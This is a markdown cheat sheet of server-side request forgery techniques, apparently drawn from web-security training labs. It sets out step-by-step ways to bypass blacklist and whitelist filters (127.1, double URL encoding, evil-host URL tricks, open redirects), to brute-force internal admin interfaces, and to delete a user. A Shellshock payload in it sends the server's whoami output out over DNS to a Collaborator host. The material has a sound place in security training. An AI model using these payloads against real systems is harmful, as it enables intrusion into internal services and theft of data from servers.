# SERVER-SIDE REQUEST FORGERY
SSRF is a web security vulnerability that allows an attacke to induce the server-side application to make requests to an unintended location

## Summary
* [Finding hidden attack surface](#finding-hidden-attack-surface-for-ssrf-vulnerability)
* [Bypassing common SSRF defenses](#bypassing-common-ssrf-defenses)
	* [Bypassing blacklist-based input filters](#bypassing-blacklist-based-input-filters)
	* [Bypassing whitelist-based input filters](#bypassing-whitelist-based-input-filters)
	* [Bypassing SSRF filters via open redirect](#bypassing-ssrf-filters-via-open-redirection)
	* [Basic SSRF againts the local server](#basic-ssrf-againts-the-local-server)
	* [Basic SSRF againts another back-end system](#basic-ssrf-againts-another-back-end-system)
* [Bypassing blind SSRF filters](#bypassing-blind-ssrf-filters)
	* [Blind SSRF with out-of-band detection](#blind-ssrf-with-out-of-band-detection)
	* [Blind SSRF with Shellshock exploitation](#blind-ssrf-with-shellshock-exploitation)

### Finding hidden attack surface for SSRF vulnerability
```
> partial URLs in requests
> URLs within data formats
> SSRF via the referer header
```

## Bypassing common SSRF defenses
### Bypassing blacklist-based input filters
```
> 127.1
> registering own domain name that resolves to 127.0.0.1
> Obfuscating blocked strings using URL encoding or case variation
```
See below examples:
```
> assume that an application lets the users to check for the item's stock
> Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
> Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
> Bypass the block by changing the URL to: http://127.1/
> Change the URL to http://127.1/admin and observe that the URL is blocked again.
> Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
```

### Bypassing whitelist-based input filters
```
> embed credentials in a URL before the hostname
	# http://expected-host@evil-host
> indicate a URL fragment
	# http://evil-host#expected-host
> leverage the DNS naming hierarchy
	# http://expected-host.evil-host
> URL-encode characters to confuse the URL-parsing code
```
See below examples:
```
> assume that an application lets the users to check for the item's stock
> Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
> Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
> Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
> Append a # to the username and observe that the URL is now rejected.
> Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
> To access the admin interface and delete the target user, change the URL to: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

### Bypassing SSRF filters via open redirection
```
> assume that an application lets the users to check for the item's stock
> Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
> try tampering with the stockApi parameter and observe that it is not possible to make the server request directly to a different host
> in the application, click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection
> create a URL that exploits the open redirection vulnerability and redirects to the admin interface in the back-end system
> stockApi=/product/nextProduct?currentProductId=19&path=http://192.168.0.12:8080/admin
> observe that the stock checker follows the redirection and shows you the admin page
```

### Basic SSRF againts the local server
```
> assume that an application lets the users to check for the item's stock
> when a user views the stock status for an item, their browser makes a request like this
> stockAPI=http://stock.com/product/stock/check?productId=1&storeId=22
> an attacker can exploit this vulnerability by simply changing the stockAPI URL into their intended URL for example http://localhost/admin
> in normal situation, the attacker could just visit the /admin URL directly but normally, the /admin page is only accessible to authenticated users
> however if the request to the /admin page URL comes from the local machine itself, the normal access controls are bypassed
```

### Basic SSRF againts another back-end system
```
> assume that an application lets the users to check for the item's stock
> suppose there is an administrative interface at the back-end URL
> http://192.x.x.x/admin
> in normal situation, an attacker would not know what the back-end URL is, so they will have to bruteforce each octets
> submit a request to check for the item's stock and send the request to Burp Intruder to brute force the back-end URL
> change the stockAPI parameter value
> http://192.168.0.1:8080/admin
> clear the payload positions and add a new one on the final octet of the IP address
> change the payload type to Numbers and enter 1,255 and 1 in the "From" and "To" and "Step" boxes respectively and start the attack.
> you should see a single entry with a status of 200, showing an admin interface. 
> right click on this request, send it to Burp Repeater, and change the URL in the stockApi to: http://192.168.0.173/admin/delete?username=carlos
```

## BYPASSING BLIND SSRF FILTERS
### Blind SSRF with out-of-band detection
```
> assume a website uses analytics software which fetches the URL specified in the Referer header
> in Burp Suite, go the the Burp menu and launch the Burp Collaborator client
> click "copy to clipboard" to copy a unique Burp Collaborator payload
> visit a product and send the request to Burp Repeater
> change the Referer header to use the generated Burp Collaborator domain in place of the original domain then send the request
> in Burp Collaborator client window, click "Poll now" and you should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
```

### Blind SSRF with Shellshock exploitation
```
> In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
> Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
> Browse the site.
> Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
> Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
> Send the request for the product page to Burp Intruder.
> Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload:
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
> Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
> Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (1), click "Add §".
> Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
> Click "Start attack".
> When the attack is finished, go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
```
